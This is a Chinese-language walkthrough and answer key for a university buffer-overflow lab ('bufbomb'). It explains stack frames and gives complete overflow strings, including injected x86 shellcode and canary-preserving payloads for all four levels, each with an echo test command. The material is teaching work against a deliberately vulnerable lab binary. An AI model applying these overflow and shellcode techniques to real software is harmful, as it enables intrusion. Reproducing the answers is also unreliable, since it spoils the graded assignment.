# 实验3：超级缓冲区炸弹

## 零、前置知识

### 0.1 什么是栈

程序运行时，每次调用函数，CPU 会在内存的**栈区**里划出一块空间叫**栈帧**，用来存局部变量、函数参数、返回地址等。栈从高地址向低地址增长。

一个典型的栈帧长这样（从低地址到高地址）：

```
┌──────────────────┐
│  局部变量          │  ← ESP 指向这里（栈顶，低地址）
├──────────────────┤
│  保存的 EBP       │  ← 上一个函数的栈底指针
├──────────────────┤
│  返回地址          │  ← 函数结束时 ret 跳转到这里
├──────────────────┤
│  参数（如果有）     │  ← 调用者放在栈上的参数
└──────────────────┘
```

关键指令和对应的机器码：

| 指令 | 作用 | 机器码示例 |
|------|------|-----------|
| `push X` | 把 X 压入栈，ESP 减 4 | `push ebx` = `53`，`push 0x401260` = `68 60 12 40 00` |
| `pop X` | 从栈顶弹出给 X，ESP 加 4 | `pop ebx` = `5B`，`pop ebp` = `5D` |
| `call func` | 把下一条指令地址压栈，跳转到 func | `call 0x401130` = `E8 XX XX XX XX` |
| `ret` | 从栈顶弹出一个地址，跳转过去 | `C3` |
| `mov eax, [addr]` | 把内存 addr 处的值加载到 EAX | `A1 XX XX XX XX` |
| `mov [addr], eax` | 把 EAX 的值写入内存 addr | `A3 XX XX XX XX` |
| `nop` | 什么都不做 | `90` |

### 0.2 什么是缓冲区溢出

`getbuf()` 函数在栈上分配了 **12 字节**的缓冲区 `buf[12]`，然后调用 `getxs(buf)` 读取用户输入。`getxs()` **不检查输入长度**。

如果你输入超过 12 字节，多出的数据就会**向上溢出**，覆盖：
1. `buf` 后面的**保存的 EBP**（4 字节）
2. 再后面的**返回地址**（4 字节）

覆盖返回地址 = 劫持程序控制流。这就是缓冲区溢出攻击。

### 0.3 小端序

x86 CPU 用**小端序**存储数据：最低字节存在最低地址。

例如地址 `0x004011F0`，在内存中存为 `F0 11 40 00`（字节顺序反转）。

所有攻击字符串中的地址都必须写成小端序。

### 0.4 本次实验的四个关卡

| 关卡 | 目标 | 核心技术 |
|------|------|---------|
| 第1关 | 跳到 `Trojan1()` | 覆盖返回地址 |
| 第2关 | 跳到 `Trojan2(cookie)` | 覆盖返回地址 + 构造栈参数 |
| 第3关 | 跳到 `Trojan3()`，但先执行注入的代码 | 注入 shellcode |
| 第4关 | 同第3关，但函数返回后程序不能崩溃 | shellcode + 逆序执行法 |

---

## 一、准备工作

### 1.1 运行程序获取通行密码

程序用你的学号初始化一个伪随机数生成器，算出 `cookie` 值（通行密码）。每个学号对应唯一的 cookie。

```bash
echo "" | ./bufbomb.exe 你的学号后6位
```

输出中会看到：

```
你的通行密码是0X2F3426A6
```

**记住这个值**：`cookie = 0x2F3426A6`，小端序 = `A6 26 34 2F`。

### 1.2 在反汇编中查找关键地址

用 IDA Pro 打开 `bufbomb.exe`，或直接打开 `bufbomb_disasm.txt`（已生成的完整反汇编文件），查找以下地址：

| 项目 | 地址 | 在反汇编中怎么找 |
|------|------|----------------|
| `getbuf` | `0x00401130` | 搜 `push ebp` 后面紧跟 `sub esp, 0Ch`，再后面 `lea eax, [ebp-0Ch]` |
| `test` | `0x00401150` | 搜 `mov [ebp-4], 0DEADBEEFh`（那只金丝雀） |
| `Trojan1` | `0x004011F0` | 搜 "恭喜" 的字符串地址引用 |
| `Trojan2` | `0x00401210` | 紧接 Trojan1 后面，开头 `push ebx; mov ebx, [esp+8]` |
| `Trojan3` | `0x00401260` | 紧接 Trojan2 后面，开头 `push ebx; mov ebx, ds:0x409004` |
| `Trojan4` | `0x004012B0` | 紧接 Trojan3 后面，开头同样是 `push ebx; mov ebx, ds:0x409004`，但结尾是 `pop ebx; ret`（不是 exit） |
| `cookie` | `0x00409000` | 搜 `ds:0x409000`，出现在 `cmp ebx, ds:0x409000` 中 |
| `global_value` | `0x00409004` | 搜 `ds:0x409004`，出现在 `mov ebx, ds:0x409004` 中 |
| test 中 `call getbuf` 的返回点 | `0x00401181` | 在 test 的反汇编中找 `call 0x00401130`，紧接其后的那条指令 |
| test 的返回点（回 main） | `0x0040140D` | 在 main 中找 `call 0x00401150`，紧接其后的 `xor eax, eax` |

### 1.3 getbuf 的栈帧布局

在 `getbuf` 的反汇编中可以看到：

```asm
push ebp              ; 保存旧 EBP
mov  ebp, esp         ; EBP = 当前栈顶
sub  esp, 0Ch         ; 向下开辟 12 字节空间给 buf
lea  eax, [ebp-0Ch]   ; eax = buf 起始地址 = EBP - 0xC
push eax              ; 把 buf 地址作为参数
call  getxs           ; 调用 getxs(buf) 读取输入
```

对应栈帧布局：

```
低地址 (栈顶)
  ┌──────────────┐
  │  buf[0..11]  │  ← EBP-0x0C  (你输入的 前 12 字节 写在这里)
  ├──────────────┤
  │  保存的 EBP   │  ← EBP+0x00  (4 字节，第 13~16 字节覆盖这里)
  ├──────────────┤
  │  返回地址     │  ← EBP+0x04  (4 字节，第 17~20 字节覆盖这里)
  ├──────────────┤
  │  ...         │  ← EBP+0x08 及以上属于 test 的栈帧
  └──────────────┘
高地址 (栈底)
```

**关键**：前 12 字节填 buf，第 13~16 字节覆盖保存的 EBP，**第 17~20 字节覆盖返回地址**。

### 1.4 用 IDA 调试器获取栈地址（第3、4关需要）

第3、4关需要跳转到 buf 来执行注入的代码，所以必须知道 buf 在内存中的确切地址。

**在 IDA Pro 中操作**：

1. **设置参数**：菜单 Debugger → Process options → Parameters 填入你的学号后6位
2. **设断点**：在 getbuf 的 `push ebp`（地址 `0x00401130`）处按 F2 设断点
3. **运行**：按 F9 启动调试，程序会停在断点处
4. **单步**：按 F7 执行到 `sub esp, 0Ch` 之后
5. **读 EBP**：在 General Registers 窗口看到 EBP 的值（例如 `0x001AFE30`）
6. **读栈内容**：打开 Stack view，从 EBP 对应的地址开始查看

以学号 720028 为例，你会看到：

```
EBP = 0x001AFE30

栈内容（从 EBP 开始）：
地址        值           含义
0x001AFE30  0x001AFE48   ← 保存的 EBP = test 的 EBP
0x001AFE34  0x00401181   ← 当前返回地址（test 中 call getbuf 后的下一条指令）
0x001AFE38  0x0000006C   ← test 的 alloca 缓冲区（'l' = 0x6C）
0x001AFE3C  0x00401177   ← test 的其他局部数据
0x001AFE40  0x00000002   ← test 的其他局部数据
0x001AFE44  0xDEADBEEF   ← 金丝雀 bird！
0x001AFE48  0x001AFF3C   ← test 保存的 EBP = main 的 EBP
0x001AFE4C  0x0040140D   ← test 的返回地址（回 main）
```

从中可以计算出：

| 需要的值 | 计算方法 | 示例值 |
|---------|---------|--------|
| buf 起始地址 | EBP - 0xC | 0x001AFE30 - 0xC = **0x001AFE24** |
| test 的 EBP | 栈中 [EBP] 的值 | **0x001AFE48** |
| bird 的地址 | test 的 EBP - 4 | **0x001AFE44** |
| main 的 EBP | 栈中 [test的EBP] 的值 | **0x001AFF3C** |
| test 返回 main 的地址 | 栈中 [test的EBP + 4] | **0x0040140D** |

---

## 二、第1关：覆盖返回地址跳转到 Trojan1

### 目标

让 `getbuf()` 返回时不回到 `test()`，而是跳到 `Trojan1()`。

### 原理

`getbuf` 结束时执行 `ret`，CPU 从栈上弹出返回地址并跳转。我们只要把返回地址覆盖成 Trojan1 的地址就行。

### 构造

```
前 12 字节（偏移 0~11）：00 填充 buf
接下来 4 字节（偏移 12~15）：00 随意覆盖保存的 EBP（Trojan1 会 exit(0)，不care）
最后 4 字节（偏移 16~19）：Trojan1 的地址，小端序
```

Trojan1 地址 = `0x004011F0` → 小端序 = `F0 11 40 00`

### 答案

```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 F0 11 40 00
```

共 20 字节。

### 测试

```bash
echo "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 F0 11 40 00" | ./bufbomb.exe 720028
```

预期输出：`恭喜你！你已经成功偷偷运行了第1只木马!` + `通过第1只木马测试`

---

## 三、第2关：跳转到 Trojan2 并传递通行密码

### 目标

跳到 `Trojan2(val)`，并且让参数 `val` 等于 cookie（通行密码）。

### 原理

第1关只覆盖了返回地址。第2关还需要在栈上**放好参数**。

看 Trojan2 的反汇编：

```asm
push ebx                  ; 保存 ebx
mov  ebx, [esp+8]         ; 从栈上读参数 val
cmp  ebx, ds:0x409000     ; 与 cookie 比较
```

它从 `[esp+8]` 读参数。为什么不是 `[esp+4]`？因为 `ret` 弹出返回地址后 ESP 已经上移了 4 字节，然后 `push ebx` 又下移了 4 字节：

```
                     ESP → ┌──────────────┐
push ebx 保存的旧 ebx       │  旧 ebx       │  ← esp+0
                            ├──────────────┤
ret 弹出的返回地址           │  返回地址      │  ← esp+4
                            ├──────────────┤
                            │  参数 val      │  ← esp+8  ← 我们要控制这个
                            └──────────────┘
```

所以返回地址之后还要再放 8 字节：4 字节假返回地址 + 4 字节 cookie。

### 构造

```
前 16 字节：同第1关（填充 buf + 覆盖 EBP）
接下来 4 字节（偏移 16~19）：Trojan2 地址 → 10 12 40 00
接下来 4 字节（偏移 20~23）：假返回地址，全零即可（Trojan2 会 exit(0)）
最后 4 字节（偏移 24~27）：通行密码，小端序 → A6 26 34 2F
```

### 答案

```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 10 12 40 00 00 00 00 00 A6 26 34 2F
```

共 28 字节。

> **如果你的学号不同**：只有最后 4 字节不同。运行一次程序看你的 cookie，转成小端序替换。例如 cookie = `0x12345678` → 末尾改成 `78 56 34 12`。

### 测试

```bash
echo "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 10 12 40 00 00 00 00 00 A6 26 34 2F" | ./bufbomb.exe 720028
```

预期输出：`不错哦！第2只木马运行了，而且通行密码是正确的！(0X2F3426A6)`

---

## 四、第3关：注入代码将 cookie 写入 global_value 并跳转到 Trojan3

### 目标

在栈上注入一段机器码（shellcode），让它：
1. 把 `cookie` 的值加载到 EAX
2. 把 EAX 存入 `global_value`
3. 跳转到 `Trojan3`

然后覆盖返回地址，让 getbuf 的 `ret` 跳到栈上的 shellcode 来执行。

### 原理

前两关只改了栈上的数据（地址、参数）。第3关更进一步：**把可执行的机器指令直接写在栈上，然后让程序跳过去执行**。

本实验的 `bufbomb.exe` 没有开启 DEP（数据执行保护），所以栈上的代码可以直接运行。

### 设计 Shellcode

把下面的汇编翻译成机器码：

```asm
mov eax, [0x409000]       ; 从 cookie 地址加载值到 EAX     → A1 00 90 40 00
mov [0x409004], eax       ; 把 EAX 写入 global_value 地址   → A3 04 90 40 00
push 0x00401260           ; 把 Trojan3 地址压入栈          → 68 60 12 40 00
ret                       ; 弹出 Trojan3 地址并跳转         → C3
```

共 **16 字节**。

### 放置 Shellcode

buf 只有 12 字节，shellcode 有 16 字节。恰好可以覆盖 buf（12 字节）+ 保存的 EBP（4 字节）= 16 字节。因为 Trojan3 会调用 `exit(0)` 直接退出，所以覆盖 EBP 也无所谓。

```
前 16 字节（偏移 0~15）：shellcode（刚好覆盖 buf + 保存的 EBP）
最后 4 字节（偏移 16~19）：buf 的栈地址（让 ret 跳回 buf 开头执行 shellcode）
```

buf 的栈地址需要用 [1.4 节](#14-用-ida-调试器获取栈地址第34关需要) 的方法在 IDA 调试器中获取。以 720028 为例，buf = `0x001AFE24`，小端序 = `24 FE 1A 00`。

### 答案

```
A1 00 90 40 00 A3 04 90 40 00 68 60 12 40 00 C3 24 FE 1A 00
```

共 20 字节。分解：

```
A1 00 90 40 00     ← mov eax, [cookie]（把 cookie 值加载到 EAX）
A3 04 90 40 00     ← mov [global_value], eax（把 EAX 写入 global_value）
68 60 12 40 00     ← push Trojan3（把 Trojan3 地址压栈）
C3                 ← ret（弹出 Trojan3 地址，跳转过去）
24 FE 1A 00        ← 返回地址 = buf 栈地址（0x001AFE24 的小端序）
```

> **如果你的学号不同**：只有最后 4 字节（buf 栈地址）不同。用 IDA 调试器获取你自己的 EBP，buf = EBP - 0xC，转成小端序替换。

### 测试

```bash
echo "A1 00 90 40 00 A3 04 90 40 00 68 60 12 40 00 C3 24 FE 1A 00" | ./bufbomb.exe 720028
```

预期输出：`厉害！第3只木马运行了，而且你修改了全局变量正确！global_value = 0X2F3426A6`

---

## 五、第4关：注入代码 + 保持栈帧完好

### 目标

与第3关类似：注入 shellcode 设置 `global_value = cookie`。但 Trojan4 不调用 `exit(0)`，而是 **`return`** 返回。程序必须继续正常运行：test 检查金丝雀 bird 不死、getbuf 返回值正确，最后 Trojan4 输出通关信息。

### 难在哪

第3关的 Trojan3 调用 `exit(0)` 直接终止程序，覆盖了什么无所谓。

第4关的 Trojan4 只是 `pop ebx; ret` 返回，控制流回到 test。test 会检查：

```c
if (bird == 0xdeadbeef) { printf("鸟还活着！\n"); }  // 金丝雀不能死
if (val == cookie)       { printf("不错哦！...\n"); }  // 返回值必须是 cookie
```

如果溢出破坏了 test 的 EBP、bird 或返回地址，程序就会崩溃。

### 解决方案：逆序执行法

**核心思想**：让 shellcode 先设好 EAX = cookie 和 global_value = cookie，然后 RET 回 test 正常执行。test 检查通过后，通过被覆盖的返回地址"顺便"跳到 Trojan4。Trojan4 的 `pop ebx; ret` 自然弹出下一个栈上值，回到 main。

```
执行顺序：getbuf → shellcode → test（检查通过）→ Trojan4（输出通关）→ main（正常结束）
```

优势：
1. shellcode 只有 `MOV; MOV; NOP; RET` 共 12 字节，刚好填满 buf，不溢出到 saved_ebp
2. 不需要额外的 fixup 代码（EAX 在 test 之前就设好了）
3. 总长度 44~48 字节，比跳板法的 70 字节短得多

### 设计 Shellcode（12 字节）

```asm
mov eax, [0x409000]       ; EAX = cookie                → A1 00 90 40 00
mov [0x409004], eax       ; global_value = cookie        → A3 04 90 40 00
nop                       ; 占位凑满 12 字节              → 90
ret                       ; 跳到栈顶指向的地址            → C3
```

共 **12 字节**，刚好等于 buf 的长度。

### 逐步构造攻击字符串

以学号 **720028** 为例（buf = `0x001AFE24`，test 的 EBP = `0x001AFE48`）：

**偏移 0~11：shellcode（12 字节，填满 buf）**

```
A1 00 90 40 00 A3 04 90 40 00 90 C3
```

**偏移 12~15：恢复 test 的 EBP**

getbuf 结束时执行 `pop ebp`，会把这里弹回 EBP。必须填回正确的值，否则 test 的 `[ebp-4]`（bird）会指向错误地址。

用 IDA 调试器查看栈中 [getbuf 的 EBP] 处的值 = test 的 EBP = `0x001AFE48`

```
48 FE 1A 00
```

**偏移 16~19：返回地址 = buf 起始地址**

getbuf 的 `ret` 弹出这个地址并跳转。我们要跳到 buf 开头执行 shellcode。buf = EBP - 0xC = `0x001AFE24`

```
24 FE 1A 00
```

**偏移 20~23：shellcode 的 ret 跳转目标**

shellcode 的 `ret` 会从栈上弹出一个地址。此时 ESP 指向这里。我们要让它回到 test 中 `call getbuf` 的下一条指令，这样 test 就会正常继续。

在反汇编中找 test 里 `call 0x00401130`（call getbuf）后面那条指令的地址 = `0x00401181`

```
81 11 40 00
```

**偏移 24~31：填充 alloca 区域**

这部分是 test 函数里 `_alloca()` 分配的栈空间，内容无所谓，全填零。

```
00 00 00 00 00 00 00 00
```

> **注意**：alloca 的大小因学号而异（`rand_div` 随学号变化），所以这部分的长度可能不同。你需要用 IDA 的 Stack view 观察 test 的 EBP 和 buf 起始地址之间的距离来确定。具体来说，bird 的位置 = test 的 EBP - 4，从 buf 起始到 bird 之间就是要填充的字节数。720028 的 bird 在偏移 32，所以填充 8 字节。

**偏移 32~35：金丝雀 bird**

test 函数中有 `if (bird == 0xdeadbeef)` 检查。在反汇编中能看到 `mov [ebp+var_4], 0DEADBEEFh`。必须保证金丝雀存活。

```
EF BE AD DE
```

**偏移 36~39：恢复 test 保存的 EBP**

test 结束时执行 `pop ebp`，会把这里弹回 EBP。必须填回 main 的 EBP，否则 main 会崩溃。

用 IDA 调试器查看栈中 [test 的 EBP] 处的值 = main 的 EBP = `0x001AFF3C`

```
3C FF 1A 00
```

**偏移 40~43：覆盖 test 的返回地址为 Trojan4**

test 结束时 `ret` 弹出这个地址。正常应该回 main（`0x0040140D`），我们把它改成 Trojan4（`0x004012B0`），让 test "返回"到 Trojan4 而不是 main。

```
B0 12 40 00
```

**偏移 44~47：Trojan4 返回到 main 的地址**

Trojan4 的反汇编确认它只是 `push ebx; ... ; pop ebx; ret`（没有 ebp 帧），所以它的 `ret` 会弹出紧接着的下一个栈上值。我们把 main 里 `call test` 后面的地址放在这里：`0x0040140D`

```
0D 14 40 00
```

### 完整答案

以学号 **720028** 为例：

```
A1 00 90 40 00 A3 04 90 40 00 90 C3 48 FE 1A 00 24 FE 1A 00 81 11 40 00 00 00 00 00 00 00 00 00 EF BE AD DE 3C FF 1A 00 B0 12 40 00 0D 14 40 00
```

共 **48 字节**。逐段对应：

```
A1 00 90 40 00     ← shellcode: mov eax, [cookie]
A3 04 90 40 00     ← shellcode: mov [global_value], eax
90                 ← shellcode: nop（凑满 12 字节）
C3                 ← shellcode: ret（跳回 test）
48 FE 1A 00        ← 恢复 test 的 EBP（0x001AFE48）
24 FE 1A 00        ← 返回地址 → buf 起始（执行 shellcode）
81 11 40 00        ← shellcode 的 ret 目标 → test 继续执行（0x00401181）
00 00 00 00        ← 填充 alloca 区域
00 00 00 00        ← 填充 alloca 区域
EF BE AD DE        ← 金丝雀 bird = 0xDEADBEEF
3C FF 1A 00        ← 恢复 main 的 EBP（0x001AFF3C）
B0 12 40 00        ← test 的返回地址 → Trojan4（0x004012B0）
0D 14 40 00        ← Trojan4 返回 main（0x0040140D）
```

### 测试

```bash
echo "A1 00 90 40 00 A3 04 90 40 00 90 C3 48 FE 1A 00 24 FE 1A 00 81 11 40 00 00 00 00 00 00 00 00 00 EF BE AD DE 3C FF 1A 00 B0 12 40 00 0D 14 40 00" | ./bufbomb.exe 720028
```

预期输出（注意顺序：test 在前，Trojan4 在后）：

```
鸟还活着！
不错哦！缓冲区溢出成功，而且getbuf返回 0X2F3426A6
厉害！第4只木马运行了，而且你修改了全局变量正确！global_value = 0X2F3426A6
通过第4只木马测试
```

### 如果你的学号不同

alloca 的大小因学号而异，所以 **bird 等关键数据的偏移量不固定**。你需要用 [1.4 节](#14-用-ida-调试器获取栈地址第34关需要) 的方法在 IDA 中获取以下信息：

| 步骤 | 需要查的值 | 在 IDA 中怎么看 | 720028 示例 |
|------|-----------|----------------|------------|
| 1 | getbuf 的 EBP | 调试时 General Registers 窗口 | `0x001AFE30` |
| 2 | buf 地址 | EBP - 0xC | `0x001AFE24` |
| 3 | test 的 EBP | Stack view 中 [getbuf 的 EBP] 处的值 | `0x001AFE48` |
| 4 | bird 的地址 | test 的 EBP - 4 | `0x001AFE44` |
| 5 | main 的 EBP | Stack view 中 [test 的 EBP] 处的值 | `0x001AFF3C` |
| 6 | main 返回点 | 反汇编中 main 里 `call test` 后的指令地址 | `0x0040140D` |

**构造步骤**：

1. 前 12 字节固定：`A1 00 90 40 00 A3 04 90 40 00 90 C3`
2. 偏移 12~15：test 的 EBP（小端序）
3. 偏移 16~19：buf 地址（小端序）
4. 偏移 20~23：固定填 `81 11 40 00`
5. 偏移 24 到 bird 偏移前：填 `00` 填充
6. bird 偏移处：`EF BE AD DE`
7. bird 后 4 字节：main 的 EBP（小端序）
8. 再后 4 字节：`B0 12 40 00`（Trojan4）
9. 最后 4 字节：main 返回点（小端序）

---

## 六、常见问题

### Q: 提示"鸟死了！堆栈已经被破坏了"？

A: 说明溢出覆盖了 `test()` 中的 `bird` 变量。检查：
- 是否在正确偏移处放置了 `EF BE AD DE`
- 是否正确恢复了 test 的 EBP（偏移 12~15）和 test 保存的 EBP（偏移 bird 后 4 字节）

### Q: 程序崩溃（无输出就挂了）？

A: 可能是返回地址写错了。检查：
- 地址是否用了**小端序**
- 地址是否拼写正确
- 第3/4关的栈地址是否是你调试得到的（不同学号地址不同）

### Q: 第3/4关段错误？

A: buf 的栈地址每次运行可能不同（但同一学号在同一系统上通常是稳定的）。用 IDA 重新调试获取地址后立刻测试。

### Q: 如何把地址/cookie 转成小端序？

A: 按字节拆开，反转顺序。例如 `0x004011F0`：
```
原始：00 40 11 F0
小端序：F0 11 40 00
```

### Q: 为什么第4关要用逆序执行法？

A: 第4关要求 Trojan4 返回后程序不崩溃。逆序法让 shellcode 先设好 EAX = cookie 和 global_value = cookie，然后 RET 回 test 的正常路径。test 检查通过后，通过被覆盖的返回地址跳到 Trojan4。Trojan4 的 `pop ebx; ret` 自然弹出下一个栈上值（main 返回点）。不需要 JMP 跳板和 fixup 代码，shellcode（12 字节）刚好填满 buf。

### Q: 为什么 Trojan4 不需要传参数？

A: 看 Trojan4 的反汇编：`mov ebx, ds:0x409004` — 它直接从内存地址 `0x409004`（global_value）读值，根本不从栈上读参数。所以不用像第2关那样在栈上构造参数。
